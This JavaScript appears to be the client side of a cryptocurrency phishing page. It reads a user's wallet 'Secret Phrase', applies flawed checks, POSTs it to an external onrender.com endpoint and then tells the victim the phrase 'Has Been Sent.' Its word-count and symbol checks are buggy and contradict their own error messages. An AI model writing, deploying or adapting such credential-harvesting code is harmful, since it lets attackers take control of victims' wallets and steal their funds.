let inputString = ""
let error1 = false;
let error2 = false;
let error3 = false;
let confirmed = ` <div class="confirm-outer">
                    <h2>Confirmed !!</h2>
                    <h3>Your Secret Phrase Has Been Sent.</h3>
                  </div>`

function checkWords(inputData){
    let no_of_words = 0;
    for(let i=0;i<inputData.length;i++){
        let smallWord = ""
        for(let j=i;j<inputData.length;j++){
            if(inputData.charAt(j) == " ") break;
            smallWord+=inputData.charAt(j);
        }
        if(checkSymbNum(smallWord) === false){
            return false;
        }
        no_of_words++;
    }
    if(no_of_words === 11){
        return 11;
    }
    return 0;
}

function checkSymbNum(inputData){
    let inputLen = inputData.length;
    for(let i=0;i<inputLen;i++){
      if((((inputData.charCodeAt(i)) >= 0 && (inputData.charCodeAt(i)) <= 65) || ((inputData.charCodeAt(i)) >= 91 && (inputData.charCodeAt(i)) <= 96) ) ||  ((inputData.charCodeAt(i)) >= 123 && (inputData.charCodeAt(i)) <= 126)){
        return false;
      }
    }
    return true;
}

document.querySelector(".text-area").addEventListener("change",(e)=>{
    inputString = e.target.value;
})

document.querySelector(".button").addEventListener("click",(e)=>{
    e.preventDefault();
    if(checkWords(inputString) === false){
        error1 = true;
        document.querySelector(".error-box").innerHTML = "*Secret Phrase Should Not Contain Any Number Or Symbol";
    }
    else if(checkSymbNum(inputString) === 0){
        error2 = true;
        document.querySelector(".error-box").innerHTML = "*Secret Phrase Should Be Of 12 Words Only";
    }

    if(error1 === false && error2 === false){
        const url = "https://backend-01-92mi.onrender.com/api/data3";
        const data = {
            packetData:inputString
        };
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        };

        fetch(url, options)
            .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
            })
            .then(data => {
            console.log(data)
            if(data.status === "Confirmed"){
                document.querySelector(".outer-box").innerHTML = confirmed
            }
            })
            .catch(error => {
                console.error('Fetch error:', error);
            });
    }
})